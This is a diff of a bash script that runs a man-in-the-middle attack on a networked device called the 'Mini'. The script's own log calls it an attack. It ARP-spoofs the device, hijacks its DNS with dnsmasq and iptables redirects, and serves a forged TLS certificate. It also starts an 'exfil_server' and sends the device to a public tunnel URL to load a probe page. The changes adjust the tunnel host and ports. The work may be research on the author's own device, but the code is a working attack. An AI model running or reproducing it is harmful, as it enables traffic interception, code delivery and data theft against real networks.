@@ -39,7 +39,7 @@ die() { log "FATAL: $*"; exit 1; }
 
 # requires privileged setup first: sudo bash scripts/mitm-setup-root.sh
 
-TUNNEL="${TUNNEL:-https://tablet-lows-researcher-responsibilities.trycloudflare.com}"
+TUNNEL="${TUNNEL:-https://c40aef6432563de7-82-122-71-109.serveousercontent.com}"
 export TUNNEL MY_IP CERT KEY MITM_PORT=4443
 
 log "===== MITM ATTACK START ====="
@@ -49,17 +49,14 @@ log "Tunnel: $TUNNEL"
 cleanup() {
   log "Cleanup..."
   kill ${SPOOF1_PID:-} ${SPOOF2_PID:-} 2>/dev/null; sleep 0.5
-  pkill -f "dnsmasq.*5353" 2>/dev/null || true
+  pkill -f "dnsmasq.*5354" 2>/dev/null || true
   pkill -f "mitm_https_server\|exfil_server" 2>/dev/null || true
   pkill -f "tcpdump.*$CAP" 2>/dev/null || true
   # iptables rules were set by mitm-setup-root.sh; try to remove with sudo -n (non-interactive)
-  sudo -n iptables -t nat -D PREROUTING -i "$IFACE" -s "192.168.1.29" -p udp --dport 53 -j REDIRECT --to-port 5353 2>/dev/null || true
-  sudo -n iptables -t nat -D PREROUTING -i "$IFACE" -s "192.168.1.29" -p tcp --dport 53 -j REDIRECT --to-port 5353 2>/dev/null || true
+  sudo -n iptables -t nat -D PREROUTING -i "$IFACE" -s "192.168.1.29" -p udp --dport 53 -j REDIRECT --to-port 5354 2>/dev/null || true
+  sudo -n iptables -t nat -D PREROUTING -i "$IFACE" -s "192.168.1.29" -p tcp --dport 53 -j REDIRECT --to-port 5354 2>/dev/null || true
   sudo -n iptables -t nat -D PREROUTING -i "$IFACE" -s "192.168.1.29" -p tcp --dport 80  -j REDIRECT --to-port 8080 2>/dev/null || true
   sudo -n iptables -t nat -D PREROUTING -i "$IFACE" -s "192.168.1.29" -p tcp --dport 443 -j REDIRECT --to-port 4443 2>/dev/null || true
-  # Restore internet
-  nmcli con delete "gh-prov" 2>/dev/null
-  nmcli con up "Livebox-C5C0" 2>/dev/null | tail -1
   log "===== DONE. Log: $LOG  Cap: $CAP ====="
 }
 trap cleanup EXIT INT TERM
@@ -76,7 +73,7 @@ openssl req -x509 -newkey rsa:2048 -days 1 -nodes \
 log "Fake cert: $CERT"
 
 # Start exfil server (pages on :8080, log on :8081)
-pkill -f "exfil_server" 2>/dev/null; sleep 0.3
+pkill -f "exfil_server" 2>/dev/null || true; sleep 0.3
 $MISE_PY "$MAGELLAN/exfil_server.py" --ip "$MY_IP" &
 EXFIL_PID=$!
 sleep 0.5
@@ -85,7 +82,7 @@ curl -s --max-time 2 "http://$MY_IP:8080/probe.html" -o /dev/null && log "Exfil 
 # Start HTTPS server on port 4443 — handles registry API + serves probe.html
 # mitm_https_server.py intercepts /cast/v2/receiver and returns TUNNEL as receiver URL
 # so cast_shell (if daemon accepts our cert) loads probe.html via valid Cloudflare TLS
-pkill -f "mitm_https_server" 2>/dev/null; sleep 0.2
+pkill -f "mitm_https_server" 2>/dev/null || true; sleep 0.2
 FAKE_CERT="$CERT" FAKE_KEY="$KEY" MITM_PORT=4443 TUNNEL="$TUNNEL" MY_IP="$MY_IP" \
   $MISE_PY "$MAGELLAN/mitm_https_server.py" 2>&1 &
 HTTPS_PID=$!
@@ -125,10 +122,10 @@ log "Mini at $MINI_IP"
 # If Mini got a different IP, update iptables rules dynamically
 if [[ "$MINI_IP" != "192.168.1.29" ]]; then
   log "Mini IP changed to $MINI_IP — updating iptables rules..."
-  sudo -n iptables -t nat -D PREROUTING -i "$IFACE" -s "192.168.1.29" -p udp --dport 53 -j REDIRECT --to-port 5353 2>/dev/null || true
+  sudo -n iptables -t nat -D PREROUTING -i "$IFACE" -s "192.168.1.29" -p udp --dport 53 -j REDIRECT --to-port 5354 2>/dev/null || true
   sudo -n iptables -t nat -D PREROUTING -i "$IFACE" -s "192.168.1.29" -p tcp --dport 80  -j REDIRECT --to-port 8080 2>/dev/null || true
   sudo -n iptables -t nat -D PREROUTING -i "$IFACE" -s "192.168.1.29" -p tcp --dport 443 -j REDIRECT --to-port 4443 2>/dev/null || true
-  sudo -n iptables -t nat -A PREROUTING -i "$IFACE" -s "$MINI_IP"   -p udp --dport 53  -j REDIRECT --to-port 5353
+  sudo -n iptables -t nat -A PREROUTING -i "$IFACE" -s "$MINI_IP"   -p udp --dport 53  -j REDIRECT --to-port 5354
   sudo -n iptables -t nat -A PREROUTING -i "$IFACE" -s "$MINI_IP"   -p tcp --dport 80  -j REDIRECT --to-port 8080
   sudo -n iptables -t nat -A PREROUTING -i "$IFACE" -s "$MINI_IP"   -p tcp --dport 443 -j REDIRECT --to-port 4443
   log "iptables updated for $MINI_IP"
@@ -157,8 +154,8 @@ log "Tunnel host: $TUNNEL_HOST → $TUNNEL_IP"
 # - Returns Cloudflare IP for our tunnel domain (so Mini can reach probe.html)
 # - Uses 1.1.1.1 for trycloudflare.com (router may not resolve it)
 # - Forwards everything else to the real Livebox DNS
-pkill -f "dnsmasq.*5353" 2>/dev/null; sleep 0.2
-dnsmasq --no-daemon --port=5353 \
+pkill -f "dnsmasq.*5354" 2>/dev/null || true; sleep 0.2
+dnsmasq --no-daemon --port=5354 \
   --listen-address=127.0.0.1 --listen-address="$MY_IP" \
   --bind-interfaces \
   --address=/commondatastorage.googleapis.com/"$MY_IP" \
@@ -177,7 +174,7 @@ sleep 0.5
 log "dnsmasq started (PID=$DNSMASQ_PID)"
 
 # Test DNS hijack works
-resolved=$(dig @127.0.0.1 -p 5353 commondatastorage.googleapis.com A +short 2>/dev/null | head -1)
+resolved=$(dig @127.0.0.1 -p 5354 commondatastorage.googleapis.com A +short 2>/dev/null | head -1)
 log "DNS test: commondatastorage.googleapis.com → $resolved (expected $MY_IP)"
 
 # Start tcpdump (we're in wireshark group)
